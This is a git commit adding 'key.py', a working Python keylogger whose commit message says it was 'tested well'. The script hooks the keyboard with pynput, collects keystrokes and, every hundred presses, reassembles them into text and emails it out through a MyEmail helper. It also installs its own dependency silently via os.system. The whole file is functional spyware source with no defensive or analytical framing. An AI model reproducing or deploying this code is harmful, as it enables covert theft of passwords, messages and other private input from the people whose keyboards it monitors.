58cf298eebe0255fdad6580d423bffaf1f27ece3
padam142 <kpadamkhadka22@gmail.com>
2022-01-20 21:35:03 +0545

    worked on keylogger and tested well

---
+++ key.py
@@ -0,0 +1,38 @@
+import pynput
+from pynput.keyboard import Key, Listener
+import MyEmail
+import os
+
+os.system("pip install pynput")
+count = 0
+keys = []
+
+def on_press(key):
+    print(key, end= " ")
+    print("pressed")
+    global keys, count
+    keys.append(str(key))
+    count += 1
+    if count > 100:
+        count = 0
+        email(keys)
+
+def email(keys):
+    message = ""
+    for key in keys:
+        k = key.replace("'","")
+        if key == "Key.space":
+            k = " "
+        elif key.find("Key")>0:
+            k = ""
+        message += k
+    print(message)
+    MyEmail.sendEmail(message)
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+
+
+with Listener(on_press = on_press, on_release = on_release) as listener:
+    listener.join()
